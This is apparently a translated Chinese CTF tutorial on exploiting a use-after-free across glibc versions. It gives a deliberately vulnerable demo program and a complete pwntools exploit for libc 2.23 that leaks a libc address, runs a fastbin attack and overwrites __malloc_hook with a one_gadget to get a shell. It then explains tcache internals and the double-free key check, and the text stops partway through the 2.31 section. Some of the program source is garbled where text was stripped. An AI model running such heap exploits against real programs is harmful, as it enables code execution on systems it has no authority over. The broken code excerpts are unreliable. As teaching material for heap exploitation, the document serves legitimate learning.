# 不同libc版本下UAF的利用手法总结
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
由于现在CTF比赛中，pwn方向涉及的libc版本众多，不同版本之间的堆块在组织方式上都有差别，刚开始学习的堆的朋友们大多数都是从最经典的UAF来入手的，本文来通过同一个UAF的demo程序，和大家一起大家交流学习下下不同版本libc下的利用手法，包括libc2.23，libc2.27，libc2.31和libc2.32下的利用手法。
​ 程序源码如下，给出了较为宽松的堆块编辑方式和组织方式，方便讨论利用手法。
    #include 
    #include 
    #include 
    size_t sizearray[20];
    char *heaparray[20];
    void myinit()
    {
        setvbuf(stdout, 0, 2, 0);
        setvbuf(stdin, 0, 2, 0);
    }
    void menu()
    {
        puts("1.add");
        puts("2.edit");
        puts("3.delete");
        puts("4.show");
        puts("5.exit");
        puts("choice> ");
    }
    void add()
    {
        int i;
        int size;
        char temp[8];
        puts("index?");
        read(0, temp, 8);
        i = atoi(temp);
        if (i > 20)
            exit(0);
        puts("size?");
        read(0, temp, 8);
        size = atoi(temp);
        if (size > 0 && size ', '1')
        p.sendafter('index', str(index))
        p.sendafter('size', str(size))
        p.sendafter('content:', content)
    def edit(index, content):
        p.sendlineafter('>', '2')
        p.sendafter('index', str(index))
        p.sendafter('content:', content)
    def show(index):
        p.sendlineafter('>', '4')
        p.sendafter('index', str(index))
    def free(index):
        p.sendlineafter('>', '3')
        p.sendafter('index', str(index))
    message = "======================== LEAK LIBC ADDRESS ======================="
    success(message)
    add(2, 0x100, '2')
    add(3, 0x10, 'protect')
    free(2)
    add(2, 0x30, 'aaaaaaaa')
    show(2)
    libc = ELF(libc_path)
    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 344 - 0x10 - libc.sym['__malloc_hook']
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    success("libc:{}".format(hex(libc_base)))
    message = "======================== FASTBIN ATTACK ======================="
    success(message)
    add(0, 0x60, 'aaaa')
    free(0)
    edit(0, p64(__malloc_hook - 0x23))
    add(1,0x60,'a')
    og = libc_base + 0xd5bf7
    add(2,0x60,0x13 * b'\x00' + p64(og))
    message = "======================== TRIGGER MALLOC HOOK ======================="
    success(message)
    p.sendlineafter('>', '1')
    p.sendafter('index', '1')
    p.sendafter('size', '1')
    p.interactive()
## 2.27
​ libc2.27在更新后，malloc源码发生了变化，基本上和libc2.31的源码一样，引入了key指针来避免double
free，所以我们在2.27下的利用手法和2.31下的利用手法基本一致，直接篡改key指针即可绕过检查。
​ 在老版libc下关于tcache的俩结构体
    /* We overlay this structure on the user-data portion of a chunk when
       the chunk is stored in the per-thread cache.  */
    typedef struct tcache_entry
    {
      struct tcache_entry *next;
    } tcache_entry;
    /* There is one of these for each thread, which contains the
       per-thread cache (hence "tcache_perthread_struct").  Keeping
       overall size low is mildly important.  Note that COUNTS and ENTRIES
       are redundant (we could have just counted the linked list each
       time), this is for performance reasons.  */
    typedef struct tcache_perthread_struct
    {
      char counts[TCACHE_MAX_BINS];
      tcache_entry *entries[TCACHE_MAX_BINS];
    } tcache_perthread_struct;
​ 从tcache中拿堆块的函数tcache_get()
    /* Caller must ensure that we know tc_idx is valid and there's
       available chunks to remove.  */
    static __always_inline void *
    tcache_get (size_t tc_idx)
    {
      tcache_entry *e = tcache->entries[tc_idx];
      assert (tc_idx entries[tc_idx] > 0);
      tcache->entries[tc_idx] = e->next;
      --(tcache->counts[tc_idx]);
      return (void *) e;
    }
​ free后放入tcache中的函数tcache_put()
    /* Caller must ensure that we know tc_idx is valid and there's room
       for more chunks.  */
    static __always_inline void
    tcache_put (mchunkptr chunk, size_t tc_idx)
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
      assert (tc_idx next = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
    }
​ tcache
bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。
​ 旧版libc2.27中，tcache结构体没有引入key指针，可以随意double
free，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查，所以在旧版libc2.27下很常见的一种利用手法就是填满tcache后，申请unsorted
bin大小的chunk利用UAF进行地址泄露，利用tcache随意double free的特性来修改__free_hook指针为one
_gadget，原理同\_ _malloc_hook。
​ 现在比赛中涉及libc2.27的一般都会换上新版的libc，新版libc2.27的部分我们到2.31处再进行讨论。
## 2.31
###  利用手法
​ 在libc2.31中，我们查看tcache的相关结构体
    /* We overlay this structure on the user-data portion of a chunk when
       the chunk is stored in the per-thread cache.  */
    typedef struct tcache_entry
    {
      struct tcache_entry *next;
      /* This field exists to detect double frees.  */
      // 新引入了key指针
      struct tcache_perthread_struct *key;
    } tcache_entry;
    /* There is one of these for each thread, which contains the
       per-thread cache (hence "tcache_perthread_struct").  Keeping
       overall size low is mildly important.  Note that COUNTS and ENTRIES
       are redundant (we could have just counted the linked list each
       time), this is for performance reasons.  */
    typedef struct tcache_perthread_struct
    {
      // 这个位置很有趣，在libc2.27中的数据结构是char一个字节，libc2.31被更新为uint16_t类型为2个字节了
      uint16_t counts[TCACHE_MAX_BINS];
      tcache_entry *entries[TCACHE_MAX_BINS];
    } tcache_perthread_struct;
​ 从tcache中拿堆块的函数tcache_get()
    /* Caller must ensure that we know tc_idx is valid and there's
       available chunks to remove.  */
    static __always_inline void *
    tcache_get (size_t tc_idx)
    {
      tcache_entry *e = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e->next;
      --(tcache->counts[tc_idx]);
      // 取出时将key字段设置为NULL
      e->key = NULL;
      return (void *) e;
    }
​ free后放入tcache中的函数tcache_put()
    /* Caller must ensure that we know tc_idx is valid and there's room
       for more chunks.  */
    static __always_inline void
    tcache_put (mchunkptr chunk, size_t tc_idx)
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
      /* Mark this chunk as "in the tcache" so the test in _int_free will
         detect a double free.  */
      e->key = tcache;
      e->next = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
    }
​ key字段用于检测是否存在double free，在_int_free中有这样一段代码来检测tcache中的double free
        if (__glibc_unlikely (e->key == tcache))
          {
            tcache_entry *tmp;
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
            for (tmp = tcache->entries[tc_idx];
             tmp;
             tmp = tmp->next)
              if (tmp == e)
            malloc_printerr ("free(): double free detected in tcache 2");
            /* If we get here, it was a coincidence.  We've wasted a
               few cycles, but don't abort.  */
          }
​